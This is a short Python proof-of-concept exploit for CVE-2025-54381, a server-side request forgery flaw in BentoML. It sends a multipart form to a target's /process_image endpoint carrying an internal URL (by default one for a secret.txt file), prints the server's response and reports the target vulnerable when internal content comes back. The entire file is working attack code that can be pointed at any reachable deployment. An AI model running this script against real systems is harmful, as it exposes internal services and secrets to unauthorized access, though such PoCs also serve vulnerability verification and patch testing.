#!/usr/bin/env python3
"""
CVE-2025-54381 - BentoML SSRF PoC
CWE-918: Server-Side Request Forgery
"""

import requests
import sys
import time

def test_ssrf(target_url, internal_url):
    print("=" * 70)
    print("CVE-2025-54381 - BentoML SSRF Vulnerability PoC")
    print("=" * 70)
    print(f"Target: {target_url}")
    print(f"Internal URL to access: {internal_url}")
    print()

    endpoint = f"{target_url}/process_image"

    print("[*] Sending SSRF payload via multipart form...")
    try:
        resp = requests.post(
            endpoint,
            files={"image": (None, internal_url)},
            timeout=30
        )
        print(f"[*] Response status: {resp.status_code}")
        print(f"[*] Response body:")
        print("-" * 70)
        print(resp.text)
        print("-" * 70)

        if "SSRF_SUCCESS" in resp.text or "secret" in resp.text.lower():
            print()
            print("[+] VULNERABLE! Successfully accessed internal resource via SSRF")
            return True
        elif "Processed file" in resp.text:
            print()
            print("[+] VULNERABLE! Server fetched content from provided URL")
            return True
        else:
            print()
            print("[-] Could not confirm vulnerability")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000"
    internal = sys.argv[2] if len(sys.argv) > 2 else "http://internal-service/secret.txt"

    print()
    print("[*] Waiting for service to be ready...")
    for i in range(30):
        try:
            requests.get(target, timeout=2)
            break
        except:
            time.sleep(1)
    print()

    result = test_ssrf(target, internal)
    print()
    sys.exit(0 if result else 1)

if __name__ == "__main__":
    main()
